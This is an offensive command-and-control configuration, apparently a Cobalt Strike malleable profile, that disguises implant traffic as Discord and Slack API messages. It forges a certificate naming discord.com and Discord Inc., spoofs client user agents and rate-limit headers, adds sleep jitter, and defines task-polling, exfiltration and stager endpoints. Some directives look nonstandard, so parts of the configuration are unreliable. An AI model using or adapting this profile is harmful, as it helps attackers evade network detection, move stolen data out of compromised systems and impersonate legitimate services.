# C2 Profile Simulating Discord or Slack Channel Traffic
# Author: @Dcodezero

# HTTPS Certificate to mimic Discord/Slack
https-certificate {
    set CN       "discord.com";
    set O        "Discord Inc.";
    set C        "US";
    set L        "San Francisco";
    set OU       "Platform Services";
    set ST       "California";
    set validity "365";
}

# Default Beacon Sleep and Jitter
set sleeptime "45000";  # 45 seconds
set jitter    "30";     # Adds 30% randomness to sleep time

# User-Agent string for Discord or Slack API
set useragent "Discord/1.0 (Linux; Android 10; Scale/3.0)";

# HTTP GET for C2 Tasks
http-get {
    set uri "/api/v9/channels/{channel_id}/messages";

    client {
        header "Accept" "application/json";
        header "Authorization" "Bot [token]";  # Replace with a placeholder bot token
        header "User-Agent" "Discord/1.0 (Windows NT 10.0; Win64; x64)";
        header "Content-Type" "application/json";

        metadata {
            json;
            prepend "{ \"user\": \"bot_user\", \"channel\": \"general\", \"request\": ";
            append " }";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "X-RateLimit-Remaining" "59";  # Simulates Discord API rate limits
        header "X-RateLimit-Reset" "12345";
        header "Connection" "keep-alive";

        output {
            prepend "{ \"id\": \"msg_";
            append "\", \"content\": \"task_data\" }";
            json;
            print;
        }
    }
}

# HTTP POST for Exfiltration
http-post {
    set uri "/api/v9/channels/{channel_id}/messages";
    set verb "POST";

    client {
        header "Accept" "application/json";
        header "Authorization" "Bearer [user-token]";  # Replace with a placeholder user token
        header "User-Agent" "Slack/4.23.0 (Mac OS X 10.15.7)";
        header "Content-Type" "application/json";

        output {
            json;
            prepend "{ \"channel\": \"#ops\", \"message\": \"";
            append "\", \"attachments\": [] }";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "X-Slack-Backend" "envoy";
        header "Connection" "keep-alive";

        output {
            prepend "{ \"ok\": true, \"timestamp\": \"";
            append "\", \"data\": \"response_received\" }";
            json;
            print;
        }
    }
}

# HTTP Stager Configuration
http-stager {
    set uri "/app-launch";

    server {
        header "Content-Type" "application/json";
        output {
            prepend "{ \"stager\": \"download\", \"id\": \"";
            append "\", \"token\": \"stager_token\" }";
            json;
            print;
        }
    }
}
